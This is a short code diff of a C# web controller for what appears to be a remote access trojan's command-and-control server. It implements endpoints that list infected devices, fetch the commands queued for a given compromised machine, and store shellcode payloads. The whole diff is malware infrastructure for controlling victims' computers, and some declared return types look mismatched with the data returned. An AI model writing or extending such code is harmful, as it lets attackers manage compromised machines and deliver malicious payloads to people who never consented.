@@ -29,13 +29,18 @@ namespace Rat_Server.Controllers
         [HttpGet("GetAllInfectedDevices")]
         public ActionResult<List<DeviceCommandDto>> GetAllInfectedDevices()
         {
-            return StatusCode(StatusCodes.Status501NotImplemented);
+            return Ok(_context.Devices.ToList());
         }
 
         [HttpGet("GetDeviceCommands/{deviceId}")]
-        public ActionResult<List<DeviceCommandDto>> GetDeviceCommands(int deviceId)
+        public ActionResult<List<Device>> GetDeviceCommands(string deviceId)
         {
-            return StatusCode(StatusCodes.Status501NotImplemented);
+            if (_context.Devices.Find(new Guid(deviceId)) == null)
+            {
+                return StatusCode(StatusCodes.Status400BadRequest);
+            }
+
+            return Ok(_context.Commands.Where(q => q.DevicedHwid == new Guid(deviceId)).ToList());
         }
 
         [HttpPost("AddShellCode")]
@@ -43,6 +48,11 @@ namespace Rat_Server.Controllers
         [ProducesResponseType(StatusCodes.Status409Conflict)]
         public async Task<ActionResult> AddShellCode([FromBody] ShellCodeDto shellCodeDto)
         {
+            if (!ModelState.IsValid)
+            {
+                return StatusCode(StatusCodes.Status400BadRequest);
+            }
+
             if(_context.ShellCodes.Single(b => b.Name == shellCodeDto.Name) != null)
             {
                 return StatusCode(StatusCodes.Status409Conflict);
